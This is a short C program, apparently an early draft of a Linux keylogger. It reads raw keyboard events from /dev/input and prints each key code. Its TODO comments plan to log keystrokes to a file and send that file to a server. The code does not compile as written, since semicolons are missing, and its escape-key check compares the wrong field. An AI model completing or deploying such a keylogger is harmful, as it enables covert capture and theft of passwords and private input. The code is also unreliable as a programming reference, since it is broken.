#include <stdio.h>
#include <stdlib.h>
#include <termios.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>

int main () {

	const char *dev = "/dev/input/by-path/platform-i8042-serio-0-event-kbd"; //file from which to read keyboard events
	int fd;
	fd = open(dev, O_RDONLY) //it opens a device file in read-only mode
	
	if (fd == -1) return EXIT_FAILURE;
	
	struct input_event ev; // struct is from input.h, define an input event
	ssize_t n; //ssize = signed integer (positive or negative number)
	
	while(1) {
		
		n = read(fd, &ev, sizeof ev) // read from file descriptor and store data at address starting from &ev
		
		if (ev.type == EV_KEY && ev.value == 1) // if key pressed (if type is EV_KEY, value indicates key state)
		printf("Key: %d", ev.code)
		
		if (ev.value == KEY_ESC) break; 
	}

  //TODO
  //save keys to a file
  //write function to send file on a server
  //rewrite code to stop at a specific entered word and not escape key
  
	close(fd); //close file descriptor
	fflush(stdout); //clean buffer
	return EXIT_FAILURE;
}
